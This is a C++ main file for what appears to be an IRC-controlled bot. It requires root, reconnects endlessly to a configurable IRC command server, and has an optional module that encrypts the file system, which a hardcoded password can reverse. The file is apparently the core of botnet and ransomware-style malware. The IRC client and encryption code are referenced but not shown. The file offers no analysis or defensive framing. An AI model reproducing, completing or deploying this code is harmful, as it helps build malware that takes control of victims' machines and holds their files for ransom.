#include "IrcClient.hpp"
#ifdef ENABLE_ENCRYPT_ACTION
#include "FileSystemDecryptor.hpp"
#include "GeneralUtils.hpp"
#endif
#include <csignal>
#include <iostream>
#include <unistd.h>

// VERY TEMP, there will be a means implemented to get validation to decrypt files via confirmation from IRC server
const char* STORED_PASS = "UnhackablePassword123!";

void ensureRootPrivileges() {
    if (geteuid() != 0) {
        std::cerr << "This program must be run as root. Please use sudo." << std::endl;
        exit(1);
    }
}


#ifdef ENABLE_ENCRYPT_ACTION
void attemptFsDecryption(int argc, char* argv[]) {
    if (argc != 3) {
        return;
    }

    if (!GeneralUtils::cStrAreEqual(argv[1], "DECRYPT")) {
        return;
    }

    if (!GeneralUtils::cStrAreEqual(argv[2], STORED_PASS)) { // VERY TEMP
        return;
    }

    FileSystemDecryptor::decryptFileSystem(GeneralUtils::getFileBaseName(argv[0]));
    exit(0);
}
#endif

int main(int argc, char* argv[]) {
    ensureRootPrivileges();
    #ifdef ENABLE_ENCRYPT_ACTION
    attemptFsDecryption(argc, argv);
    #endif

    std::string serverAddress = "127.0.0.1";
    std::string botNick = "botNick";
    std::string botUser = "botUser";
    std::string assignedChannel = "#general";
    std::string botPass = "pass";

    #ifdef SERVER_ADDRESS
        serverAddress = SERVER_ADDRESS;
    #endif

    #ifdef BOT_NICK
        botNick = BOT_NICK;
    #endif

    #ifdef BOT_USER
        botUser = BOT_USER;
    #endif

    #ifdef ASSIGNED_CHANNEL
        assignedChannel = ASSIGNED_CHANNEL;
    #endif

    #ifdef BOT_PASS
        botPass = BOT_PASS;
    #endif

    signal(SIGINT, IrcClient::signalHandler);
    signal(SIGTERM, IrcClient::signalHandler);
    const char* exeName = argv[0];
    while(true) {
        try {
            IrcClient client(serverAddress, 6667, exeName, botNick, botUser, assignedChannel, botPass);
            client.connect();
        } catch (const std::exception& ex) {
            std::cerr << "Error: " << ex.what() << std::endl;
        }
    }

    return 0;
}
